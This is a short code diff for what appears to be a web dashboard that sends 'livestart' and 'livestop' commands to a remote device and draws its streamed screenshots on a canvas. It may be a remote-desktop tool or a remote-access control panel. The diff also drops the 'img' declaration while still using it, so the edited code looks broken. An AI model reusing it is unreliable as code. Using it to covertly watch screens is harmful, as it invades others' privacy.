@@ -41,6 +41,10 @@ leave_button.addEventListener("click", () => {
     id: c.id,
     cmd: "live",
   });
+  socket.emit("command", { // version >1.4
+    id: c.id,
+    cmd: "livestop",
+  });
   window.location.href = `/dashboard`;
 });
 
@@ -142,6 +146,10 @@ socket.emit("command", {
   id: c.id,
   cmd: "live",
 });
+socket.emit("command", { // Version >1.4
+  id: c.id,
+  cmd: "livestart",
+});
 let fps = 0;
 var ctx = c.getContext("2d");
 ctx.canvas.width = window.innerWidth;
@@ -164,13 +172,8 @@ setInterval(() => {
   }
   fps = 0;
 }, 1000);
-// socket.emit("command", {
-//   id: document.getElementById("id").getAttribute("data-id"),
-//   cmd: "screenshot",
-// });
-socket.on("screenshotResult", (msg) => {
-  var img = new Image();
 
+socket.on("screenshotResult", (msg) => {
   img.onload = function () {
     ctx.drawImage(img, 0, 0, window.innerWidth, window.innerHeight);
   };
